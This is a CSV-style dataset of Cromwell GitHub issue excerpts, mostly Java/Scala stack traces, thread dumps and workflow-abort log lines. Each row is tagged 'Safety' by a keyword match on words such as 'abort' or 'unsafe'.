Safety,"t.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:352); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.execute(AbstractGoogleClientRequest.java:469); at com.google.cloud.hadoop.util.AbstractGoogleAsyncWriteChannel$UploadOperation.call(AbstractGoogleAsyncWriteChannel.java:357); at java.util.concurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2016-10-27 13:11:05,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:06,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:07,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:08,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:09,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:10,95] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:11:11,95] [info] Waiting for 1 workflows to abort...; Killed; lichtens@lichtens-big:~/test_eval$ [2016-10-27 13:11:12,80] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:21202,abort,abort,21202,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,t.internals.TrampolineEC$JVMTrampoline.$anonfun$startLoop$1(TrampolineEC.scala:93); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85); 	at cats.effect.internals.TrampolineEC$JVMTrampoline.startLoop(TrampolineEC.scala:93); 	at cats.effect.internals.Trampoline.execute(Trampoline.scala:43); 	at cats.effect.internals.TrampolineEC.execute(TrampolineEC.scala:44); 	at cats.effect.internals.ForwardCancelable.loop$1(ForwardCancelable.scala:46); 	at cats.effect.internals.ForwardCancelable.$anonfun$cancel$1(ForwardCancelable.scala:52); 	at cats.effect.internals.ForwardCancelable.$anonfun$cancel$1$adapted(ForwardCancelable.scala:52); 	at cats.effect.internals.IORunLoop$RestartCallback.start(IORunLoop.scala:337); 	at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:119); 	at cats.effect.internals.IORunLoop$.start(IORunLoop.scala:34); 	at cats.effect.IO.unsafeRunAsync(IO.scala:258); 	at cats.effect.internals.IORace$.onSuccess$1(IORace.scala:40); 	at cats.effect.internals.IORace$.$anonfun$simple$4(IORace.scala:79); 	at cats.effect.internals.IORace$.$anonfun$simple$4$adapted(IORace.scala:77); 	at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:136); 	at cats.effect.internals.IORunLoop$RestartCallback.signal(IORunLoop.scala:351); 	at cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:372); 	at cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:312); 	at cats.effect.internals.IOShift$Tick.run(IOShift.scala:36); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPo,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5178:3700,unsafe,unsafeRunAsync,3700,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5178,1,['unsafe'],['unsafeRunAsync']
Safety,t.internals.TrampolineEC$JVMTrampoline.$anonfun$startLoop$1(TrampolineEC.scala:93); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85); 	at cats.effect.internals.TrampolineEC$JVMTrampoline.startLoop(TrampolineEC.scala:93); 	at cats.effect.internals.Trampoline.execute(Trampoline.scala:43); 	at cats.effect.internals.TrampolineEC.execute(TrampolineEC.scala:44); 	at cats.effect.internals.ForwardCancelable.loop$1(ForwardCancelable.scala:46); 	at cats.effect.internals.ForwardCancelable.$anonfun$cancel$1(ForwardCancelable.scala:52); 	at cats.effect.internals.ForwardCancelable.$anonfun$cancel$1$adapted(ForwardCancelable.scala:52); 	at cats.effect.internals.IORunLoop$RestartCallback.start(IORunLoop.scala:341); 	at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:119); 	at cats.effect.internals.IORunLoop$.start(IORunLoop.scala:34); 	at cats.effect.IO.unsafeRunAsync(IO.scala:257); 	at cats.effect.internals.IORace$.onSuccess$1(IORace.scala:40); 	at cats.effect.internals.IORace$.$anonfun$simple$4(IORace.scala:79); 	at cats.effect.internals.IORace$.$anonfun$simple$4$adapted(IORace.scala:77); 	at cats.effect.internals.IORunLoop$.cats$effect$internals$IORunLoop$$loop(IORunLoop.scala:136); 	at cats.effect.internals.IORunLoop$RestartCallback.signal(IORunLoop.scala:355); 	at cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:376); 	at cats.effect.internals.IORunLoop$RestartCallback.apply(IORunLoop.scala:316); 	at cats.effect.internals.IOShift$Tick.run(IOShift.scala:36); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPo,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5925:3016,unsafe,unsafeRunAsync,3016,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5925,1,['unsafe'],['unsafeRunAsync']
Safety,"tch.ForkJoinExecutorConfigurator$AkkaForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ""ForkJoinPool-3-worker-5"" #82 daemon prio=5 os_prio=31 tid=0x00007fb76cc73800 nid=0xcd03 waiting on condition [0x0000000134661000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0041f30> (a scala.concurrent.forkjoin.ForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ""pool-1-thread-20"" #81 prio=5 os_prio=31 tid=0x00007fb76cc5b800 nid=0xcb03 waiting on condition [0x000000013455e000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(ThreadPoolExecutor.java:1067); at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1127); at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617); at java.lang.Thread.run(Thread.java:745). ""pool-1-thread-19"" #80 prio=5 os_prio=31 tid=0x00007fb76cc59800 nid=0xc903 waiting on condition [0x0000000134093000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchroniz",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:1534,Unsafe,Unsafe,1534,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,1,['Unsafe'],['Unsafe']
Safety,"tcher-120 INFO - WorkflowExecutionActor [UUID(28d5b663)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:28,999 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(7c8b62e6)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:40,026 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(3206b2df)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:35:03,235 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(63064089)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:13,509 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(812336d3)]: Abort received. Aborting 14 EJEAs; 2016-12-12 18:35:23,568 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(197caaf2)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:35:36,241 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(98068011)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:35:46,427 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(b5d75f00)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:56,417 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(0891d5a0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:05,640 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(51571dc0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:15,513 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(c43b628c)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:36:24,633 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(50785284)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:36:34,764 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(8dd2fe57)]: Abor",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:3696,Abort,Abort,3696,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Abort']
Safety,"tcher-120 INFO - WorkflowExecutionActor [UUID(812336d3)]: Abort received. Aborting 14 EJEAs; 2016-12-12 18:35:23,568 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(197caaf2)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:35:36,241 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(98068011)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:35:46,427 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(b5d75f00)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:56,417 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(0891d5a0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:05,640 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(51571dc0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:15,513 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(c43b628c)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:36:24,633 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(50785284)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:36:34,764 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(8dd2fe57)]: Abort received. Aborting 2 EJEAs; 2016-12-12 18:36:45,132 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(7f1250f8)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:37:06,029 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(3d36fdc3)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:37:14,145 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(60ec6228)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:37:23,720 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(a442dc1c)]: Abort",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:4342,Abort,Abort,4342,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Abort']
Safety,"tcher-120 INFO - WorkflowExecutionActor [UUID(aadd5082)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:01,265 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(edaa9993)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:12,453 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(c2caa0f6)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:30,399 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(17a61aa5)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:42,564 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(f6bef34c)]: Abort received. Aborting 9 EJEAs; 2016-12-12 18:34:05,494 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(44318e55)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:34:16,741 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(28d5b663)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:28,999 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(7c8b62e6)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:40,026 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(3206b2df)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:35:03,235 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(63064089)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:13,509 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(812336d3)]: Abort received. Aborting 14 EJEAs; 2016-12-12 18:35:23,568 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(197caaf2)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:35:36,241 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(98068011)]: Abo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:2726,Abort,Abort,2726,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Abort']
Safety,"tcher-120 INFO - WorkflowExecutionActor [UUID(c2caa0f6)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:30,399 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(17a61aa5)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:42,564 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(f6bef34c)]: Abort received. Aborting 9 EJEAs; 2016-12-12 18:34:05,494 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(44318e55)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:34:16,741 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(28d5b663)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:28,999 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(7c8b62e6)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:40,026 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(3206b2df)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:35:03,235 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(63064089)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:13,509 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(812336d3)]: Abort received. Aborting 14 EJEAs; 2016-12-12 18:35:23,568 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(197caaf2)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:35:36,241 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(98068011)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:35:46,427 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(b5d75f00)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:56,417 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(0891d5a0)]: Abor",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:3049,Abort,Abort,3049,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Abort']
Safety,"tcher-1282 INFO - WorkflowExecutionActor [UUID(44318e55)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:34:16,741 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(28d5b663)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:28,999 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(7c8b62e6)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:40,026 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(3206b2df)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:35:03,235 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(63064089)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:13,509 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(812336d3)]: Abort received. Aborting 14 EJEAs; 2016-12-12 18:35:23,568 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(197caaf2)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:35:36,241 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(98068011)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:35:46,427 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(b5d75f00)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:56,417 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(0891d5a0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:05,640 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(51571dc0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:15,513 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(c43b628c)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:36:24,633 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(50785284)]: Abor",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:3534,Abort,Abort,3534,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Abort']
Safety,"tcher-1282 INFO - WorkflowExecutionActor [UUID(63064089)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:13,509 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(812336d3)]: Abort received. Aborting 14 EJEAs; 2016-12-12 18:35:23,568 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(197caaf2)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:35:36,241 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(98068011)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:35:46,427 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(b5d75f00)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:56,417 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(0891d5a0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:05,640 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(51571dc0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:15,513 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(c43b628c)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:36:24,633 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(50785284)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:36:34,764 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(8dd2fe57)]: Abort received. Aborting 2 EJEAs; 2016-12-12 18:36:45,132 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(7f1250f8)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:37:06,029 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(3d36fdc3)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:37:14,145 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(60ec6228)]: Abort",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:4180,Abort,Abort,4180,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Abort']
Safety,"tcher-1282 INFO - WorkflowExecutionActor [UUID(7c8b62e6)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:40,026 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(3206b2df)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:35:03,235 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(63064089)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:13,509 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(812336d3)]: Abort received. Aborting 14 EJEAs; 2016-12-12 18:35:23,568 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(197caaf2)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:35:36,241 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(98068011)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:35:46,427 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(b5d75f00)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:56,417 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(0891d5a0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:05,640 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(51571dc0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:15,513 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(c43b628c)]: Abort received. Aborting 8 EJEAs; 2016-12-12 18:36:24,633 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(50785284)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:36:34,764 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(8dd2fe57)]: Abort received. Aborting 2 EJEAs; 2016-12-12 18:36:45,132 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(7f1250f8)]: Abort",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:3857,Abort,Abort,3857,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Abort']
Safety,"tcher-1282 INFO - WorkflowExecutionActor [UUID(f6bef34c)]: Abort received. Aborting 9 EJEAs; 2016-12-12 18:34:05,494 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(44318e55)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:34:16,741 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(28d5b663)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:28,999 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(7c8b62e6)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:40,026 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(3206b2df)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:35:03,235 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(63064089)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:13,509 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(812336d3)]: Abort received. Aborting 14 EJEAs; 2016-12-12 18:35:23,568 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - WorkflowExecutionActor [UUID(197caaf2)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:35:36,241 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(98068011)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:35:46,427 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(b5d75f00)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:56,417 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(0891d5a0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:05,640 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(51571dc0)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:36:15,513 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(c43b628c)]: Abo",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:3372,Abort,Abort,3372,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Abort']
